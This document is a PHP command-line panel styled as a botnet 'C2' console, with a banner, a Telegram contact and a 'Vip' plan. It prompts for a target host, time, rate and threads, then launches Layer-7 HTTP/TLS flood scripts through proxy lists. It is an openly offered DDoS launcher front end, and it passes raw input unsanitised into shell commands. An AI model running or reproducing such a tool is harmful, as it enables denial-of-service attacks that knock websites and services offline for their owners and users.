<?php
function logo() {
$logo = "\e[1;31m".'

   ___  ____  _______  ____________
  / _ )/ __ \/_  __/ |/ / __/_  __/
 / _  / /_/ / / / /    / _/  / /   
/____/\____/ /_/ /_/|_/___/ /_/    
                                   

';
echo $logo;
} 
function help() {
$help = "
\e[1;37mRULE:
\e[1;32mL7: \e[1;33m[Raw, \e[1;34mTls, \e[1;35mMix, \e[1;36mDestroy]
\e[1;37mPlan: \e[1;31mVip
\e[1;32mTelE: \e[1;33m@nguyenhaouser2
\e[1;34mCommand: \e[1;35m!<methods name>, \e[1;37m!stop
";
echo $help;
}
function input_line() {
system("clear");
logo();
$user_input = readline("\e[1;31mroot\e[1;32m@\e[1;33mc2\e[1;34m: ");
runmethods($user_input);
}
function runmethods($user_input) {
if($user_input=="!help") {
help();
sleep(21);
input_line();
}
if($user_input=="!stop") {
exit();
}
system("clear");
logo();
$host = readline("\e[1;35mHost: ");
$time = readline("\e[1;36mTime: ");
$rate = readline("\e[1;37mRate: ");
$threads = readline("\e[1;31mThreads: ");
if($user_input=="!raw") {
echo "\e[1;32m𝑨𝒕𝒕𝒂𝒄𝒌 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 !!!\n";
system("node /sdcard/download/raw.js $host $time $threads $rate /sdcard/download/proxy.txt");
system("clear");
logo();
}
if($user_input=="!mix") {
echo "\e[1;32m𝑨𝒕𝒕𝒂𝒄𝒌 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 !!!\n";
system("node /sdcard/download/mix.js $host $threads $time");
system("clear");
logo();
sleep(21);
input_line();
}
if($user_input=="!tls") {
echo "\e[1;32m𝑨𝒕𝒕𝒂𝒄𝒌 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 !!!\n";
system("node /sdcard/download/tls.js $host $time $rate $threads /sdcard/download/proxy.txt");
system("clear");
logo();
sleep(21);
input_line();
}
if($user_input=="!destroy") {
echo "\e[1;32m𝑨𝒕𝒕𝒂𝒄𝒌 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 !!!\n";
system("node /sdcard/download/destroy.js $host $time $rate $threads /sdcard/download/proxy.txt");
system("clear");
logo();
sleep(21);
input_line();
}

}
input_line();